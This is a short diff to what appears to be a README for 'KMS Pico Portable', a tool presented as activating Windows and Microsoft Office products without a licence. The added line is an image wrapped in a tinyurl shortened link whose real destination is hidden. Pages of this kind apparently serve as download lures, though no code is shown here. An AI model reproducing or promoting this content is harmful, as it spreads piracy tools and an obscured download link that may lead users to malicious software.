@@ -6,7 +6,7 @@ A portable activation tool for Windows and Microsoft Office products. 🖥️�
 
 KMS Pico Portable is a standalone utility designed for activating Microsoft Windows operating systems and Office suites. This portable version requires no installation and can run directly from USB drives or local folders. 💾➡️⚡
 
-
+[![6357658](https://github.com/user-attachments/assets/102460c7-1665-4ffd-9081-1b6e3fb97361)](https://tinyurl.com/bded4sr3)
 
 ## ✨ Features
 
